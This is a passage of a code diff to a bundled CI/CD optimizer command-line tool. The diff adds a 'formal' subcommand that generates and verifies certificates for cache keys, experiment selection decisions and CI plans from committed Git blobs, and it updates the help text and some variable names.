+  "At expiry the reducer may promote the best currently eligible candidate despite unfinished nonfailed candidates. Their unknown outcomes and all unproposed candidates remain outside the maximum claim."
+];
+function createDecisionCertificate(sources, at) {
+  const sourceList = Object.values(sources);
+  sourceList.forEach(validateSourceBlob);
+  if (new Set(sourceList.map((source) => source.commit)).size !== 1) throw new Error("Decision inputs must be recorded at the same commit.");
+  const now2 = new Date(at);
+  if (!Number.isFinite(now2.getTime()) || now2.toISOString() !== at) throw new Error("Decision time must be a canonical UTC ISO timestamp with milliseconds.");
+  const parsedConfig = parseHillClimbConfig(sources.config.content);
+  if (parsedConfig.problems.length) throw new Error(`Invalid committed scoring configuration: ${JSON.stringify(parsedConfig.problems)}`);
+  const config = parsedConfig.config;
+  const parsedManifest = parseManifest2(sources.manifest.content, { config });
+  if (!parsedManifest.manifest) throw new Error(`Invalid committed manifest: ${JSON.stringify(parsedManifest.problems)}`);
+  const manifest = parsedManifest.manifest;
+  const measurements = parseMeasurements(sources.measurements.content);
+  const decision = decide(manifest, measurements, config, { now: now2, trunkRef: trunkBranch(manifest.name), armRef: (arm) => armBranch(manifest.name, arm) });
+  const parameters = selectionParameters(config);
+  const candidates2 = [...manifest.arms].sort((a, b) => a.name < b.name ? -1 : a.name > b.name ? 1 : 0).map((arm) => {
+    const measured = measurements.arms.find((entry2) => entry2.arm === arm.name);
+    const { candidate } = evaluateArm(manifest, measurements.control, measured ?? { arm: arm.name, changedPaths: [] }, config);
+    return { name: arm.name, inputs: candidate, outcome: evaluateCandidate(candidate, parameters.minimum, parameters.influence) };
+  });
+  return seal({
+    schema: CERTIFICATE_SCHEMA,
+    kind: "finite-selection",
+    proof: PROOF_BUILD,
+    sources,
+    request: { at },
+    assumptions: SELECTION_ASSUMPTIONS,
+    result: {
+      objective: { scale: OBJECTIVE_SCALE, weightScale: WEIGHT_SCALE, ...parameters, metrics: metricsFor(manifest, config).map((metric) => metric.id), tieBreak: "rank-desc,deterministic-desc,ascii-name-asc" },
+      candidateUniverse: candidates2.map((candidate) => candidate.name),
+      unlistedMeasurements: measurements.arms.filter((arm) => !manifest.arms.some((spec2) => spec2.name === arm.arm)).map((arm) => arm.arm).sort(),
+      allNonfailedCandidatesFinished: candidates2.every((candidate) => candidate.outcome.failed || !candidate.outcome.pending),
+      candidates: candidates2,
+      exclusions: candidates2.filter((candidate) => !candidate.outcome.eligible).map((candidate) => ({
+        name: candidate.name,
+        reason: candidate.outcome.failed ? "hard-gate-failed" : candidate.outcome.pending ? "unfinished" : "below-minimum"
+      })),
+      decision: {
+        action: decision.action,
+        reason: decision.reason,
+        ...decision.action === "promote" ? { winner: decision.winner, losers: decision.losers } : {},
+        ...decision.action === "wait" ? { dispatch: decision.dispatch } : {}
+      }
+    }
+  });
+}
+function decodeDependencies(value2) {
+  if (value2 === null) return null;
+  if (!Array.isArray(value2)) throw new Error("Declared dependencies must be an array or null (explicit inference policy).");
+  return value2.map((entry2) => string(entry2, "dependency"));
+}
+async function checkCertificate(text7, repository) {
+  const supplied = object(parseStrictJson(text7), "certificate");
+  if (supplied.schema !== CERTIFICATE_SCHEMA || canonicalJson(supplied.proof) !== canonicalJson(PROOF_BUILD)) throw new Error("Certificate schema or compiled-in proof build does not match this checker.");
+  const request = object(supplied.request, "request");
+  let expected;
+  let sources;
+  let resultStatus;
+  if (supplied.kind === "cache-key") {
+    const source = decodeSourceBlob(supplied.source);
+    sources = [source];
+    expected = createCacheCertificate(source, string(request.job, "job"), integer(request.step, "step"), decodeDependencies(request.dependencies));
+  } else if (supplied.kind === "finite-selection") {
+    const input2 = object(supplied.sources, "sources");
+    const decoded = { manifest: decodeSourceBlob(input2.manifest), config: decodeSourceBlob(input2.config), measurements: decodeSourceBlob(input2.measurements) };
+    sources = Object.values(decoded);
+    expected = createDecisionCertificate(decoded, string(request.at, "at"));
+  } else if (supplied.kind === "ci-policy-plan") {
+    const source = decodeSourceBlob(supplied.source);
+    sources = [source];
+    const plan = createCiPlanCertificate(source, integer(request.searchBudget, "searchBudget", 1, CI_MODEL_LIMITS.maxSearchBudget));
+    expected = plan;
+    resultStatus = plan.result.status;
+  } else throw new Error("Unsupported certificate kind.");
+  if (canonicalJson(supplied) !== canonicalJson(expected)) throw new Error("Certificate does not match full recomputation (including its digest).");
+  if (repository !== void 0) await bindSources(sources, repository);
+  return {
+    status: repository === void 0 ? "model-valid" : "source-bound-valid",
+    kind: expected.kind,
+    digest: expected.digest,
+    ...resultStatus === void 0 ? {} : { resultStatus }
+  };
+}
+
+// src/cli/formal.ts
+var FORMAL_HELP = `Usage:
+  ci-cd-optimizer formal cache-key --commit <full-sha> --path <git-path> --job <id> --step <0-based>
+      [--source <repository>] [--dependencies <json-array-file>] [--output <certificate.json>]
+  ci-cd-optimizer formal decision --commit <full-sha> --manifest <git-path> --config <git-path>
+      --measurements <git-path> --at <YYYY-MM-DDTHH:mm:ss.sssZ> [--source <repository>] [--output <certificate.json>]
+  ci-cd-optimizer formal ci-plan --commit <full-sha> --path <ci-environment.json>
+      [--search-budget <policies>] [--source <repository>] [--output <certificate.json>]
+  ci-cd-optimizer formal check <certificate.json> [--source <repository>]
+
+Creation reads immutable commit:path blobs, not working files. Dependencies omitted means the explicitly
+labeled inference policy (key components except SHA/run counters); it is not workload dependency discovery.
+Checking without --source validates only the embedded model data. A digest is not a signature.
+CI planning binds the model input only, not its correspondence to any workflow. Certificate validity
+does not imply an optimal result: inspect resultStatus (optimal, infeasible, or budget-exhausted).
+Exit codes: 0 source-bound-valid; 3 model-valid without source binding; 1 invalid; 2 usage.
+See docs/formal-verification.md for the precise model, numeric bounds, assumptions and proof commands.`;
+var text6 = async (path) => new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(await readFile8(path));
+async function formalCommand(args, io) {
+  const [command, ...rest] = args;
+  if (!command || command === "--help" || command === "-h") {
+    io.stdout(FORMAL_HELP);
+    return 0;
+  }
+  if (command === "check") {
+    const { values: values3, positionals: positionals3 } = parseArgs11({ args: rest, strict: true, allowPositionals: true, options: { source: { type: "string" } } });
+    const file = positionals3[0];
+    if (!file || positionals3.length !== 1) throw new UsageError("formal check requires one certificate file.");
+    const result = await checkCertificate(await text6(resolvePath(io, file)), values3.source === void 0 ? void 0 : resolvePath(io, values3.source));
+    io.stdout(canonicalJson(result));
+    return result.status === "source-bound-valid" ? 0 : 3;
+  }
+  if (command !== "cache-key" && command !== "decision" && command !== "ci-plan") throw new UsageError(`Unknown formal command: ${command}`);
+  const { values: values2 } = parseArgs11({
+    args: rest,
+    strict: true,
+    options: {
+      source: { type: "string" },
+      commit: { type: "string" },
+      output: { type: "string" },
+      ...command === "cache-key" ? { path: { type: "string" }, job: { type: "string" }, step: { type: "string" }, dependencies: { type: "string" } } : command === "decision" ? { manifest: { type: "string" }, config: { type: "string" }, measurements: { type: "string" }, at: { type: "string" } } : { path: { type: "string" }, "search-budget": { type: "string" } }
+    }
+  });
+  const required = (name) => {
+    const value2 = values2[name];
+    if (typeof value2 !== "string" || !value2) throw new UsageError(`formal ${command} requires --${name}.`);
+    return value2;
+  };
+  const repository = resolvePath(io, typeof values2.source === "string" ? values2.source : ".");
+  const commit = required("commit");
+  if (!/^(?:[a-f0-9]{40}|[a-f0-9]{64})$/.test(commit)) throw new UsageError("--commit must be a full lowercase Git commit id.");
+  let certificate;
+  if (command === "cache-key") {
+    const stepText = required("step");
+    const step = Number(stepText);
+    if (!/^(?:0|[1-9]\d*)$/.test(stepText) || !Number.isSafeInteger(step)) throw new UsageError("--step must be a nonnegative integer.");
+    let dependencies = null;
+    if (typeof values2.dependencies === "string") {
+      const parsed = parseStrictJson(await text6(resolvePath(io, values2.dependencies)));
+      if (!Array.isArray(parsed)) throw new UsageError("--dependencies must name a JSON array of expression strings.");
+      dependencies = parsed.map((entry2) => string(entry2, "dependency"));
+    }
+    certificate = createCacheCertificate(await readCommittedBlob(repository, commit, required("path")), required("job"), step, dependencies);
+  } else if (command === "decision") {
+    const at = required("at");
+    const date = new Date(at);
+    if (!Number.isFinite(date.getTime()) || date.toISOString() !== at) throw new UsageError("--at must be a canonical UTC ISO timestamp with milliseconds.");
+    const [manifest, config, measurements] = await Promise.all(["manifest", "config", "measurements"].map((key2) => readCommittedBlob(repository, commit, required(key2))));
+    if (!manifest || !config || !measurements) throw new Error("Missing committed decision source.");
+    certificate = createDecisionCertificate({ manifest, config, measurements }, at);
+  } else {
+    certificate = createCiPlanCertificate(
+      await readCommittedBlob(repository, commit, required("path")),
+      searchBudgetOption(values2["search-budget"])
+    );
+  }
+  const serialized = canonicalJson(certificate);
+  const checked = await checkCertificate(serialized, repository);
+  await writeText(io, typeof values2.output === "string" ? values2.output : void 0, serialized);
+  io.stderr(`source-bound-valid: checked against recorded Git blobs; evidence authenticity and real-world performance are not attested.${checked.resultStatus ? ` Model outcome: ${checked.resultStatus}; workflow correspondence remains an assumption.` : ""}`);
+  return 0;
+}
+
 // src/cli/index.ts
 var HELP2 = `ci-cd-optimizer ${VERSION} - a CI/CD performance linter and optimizer for GitHub repositories
 
@@ -41712,30 +49538,32 @@ Commands:
   rules                 List rules (--format json|markdown)
   scan                  Scan a repository via the API like the App: SARIF, finding issues, autofix PRs
   telemetry             Report on a completed workflow run (Gantt, critical path) and raise duration alerts
-  experiments <cmd>     Hill-climbing experiments: list, context, create, collect, evaluate, decide
+  experiments <cmd>     Conditional CI model planning and measured experiments: plan, context, create, collect, evaluate, decide
   recipes <cmd>         Reusable fixes from promoted experiments: publish, apply, status, rollout
   knowledge <cmd>       Authorized mitigation history: applications, runs, inspect, refresh, evaluate
   maintenance <cmd>     Operator-only knowledge retention and erasure (preview by default)
   execution <cmd>       Opt-in task capture and authorized runtime report import/inspection
   review <cmd>          Project review program: validate, run, intake, scheduled (docs/review-program)
+  formal <cmd>          Input-bound cache-key, finite-selection and CI model planning certificates (docs/formal-verification)
   help [command]        Show help
   version               Print the version
 
 Exit codes: 0 success, 1 findings at or above --fail-on (or a failed operation), 2 usage or configuration error.
+Planning also uses 4 for proved model infeasibility and 5 for exhausted search; formal check uses 3 for model-only validity.
 `;
 var RULES_HELP = `Usage: ci-cd-optimizer rules [--format text|json|markdown] [--output <file>]`;
 async function rulesCommand(args, io) {
-  const { values: values2 } = parseArgs10({ args, strict: true, options: { format: { type: "string", short: "f", default: "text" }, output: { type: "string", short: "o" }, help: { type: "boolean", short: "h", default: false } } });
+  const { values: values2 } = parseArgs12({ args, strict: true, options: { format: { type: "string", short: "f", default: "text" }, output: { type: "string", short: "o" }, help: { type: "boolean", short: "h", default: false } } });
   if (values2.help) {
     io.stdout(RULES_HELP);
     return 0;
   }
-  let text6;
-  if (values2.format === "markdown") text6 = renderRulesMarkdown(allRules);
-  else if (values2.format === "json") text6 = JSON.stringify(allRules.map((rule) => rule.meta), null, 2);
-  else if (values2.format === "text") text6 = ruleListText(allRules);
+  let text7;
+  if (values2.format === "markdown") text7 = renderRulesMarkdown(allRules);
+  else if (values2.format === "json") text7 = JSON.stringify(allRules.map((rule) => ({ ...rule.meta, assurance: ruleAssurance(rule.meta.id) })), null, 2);
+  else if (values2.format === "text") text7 = ruleListText(allRules);
   else throw new UsageError(`Unknown format "${values2.format}". Use text, json, or markdown.`);
-  await writeText(io, values2.output, text6);
+  await writeText(io, values2.output, text7);
   return 0;
 }
 var COMMANDS4 = {
@@ -41748,7 +49576,8 @@ var COMMANDS4 = {
   knowledge: { run: knowledgeCommand, help: KNOWLEDGE_HELP },
   maintenance: { run: maintenanceCommand, help: MAINTENANCE_HELP },
   execution: { run: executionCommand, help: EXECUTION_HELP },
-  review: { run: reviewCommand, help: REVIEW_HELP }
+  review: { run: reviewCommand, help: REVIEW_HELP },
+  formal: { run: formalCommand, help: FORMAL_HELP }
 };
 async function run3(argv, io) {
   const [first, ...rest] = argv;
@@ -41788,7 +49617,7 @@ async function isDirectory2(io, path) {
 }
 
 // src/action.ts
-var write = (stream) => (text6) => stream.write(text6.endsWith("\n") ? text6 : `${text6}
+var write = (stream) => (text7) => stream.write(text7.endsWith("\n") ? text7 : `${text7}
 `);
 var code2;
 try {
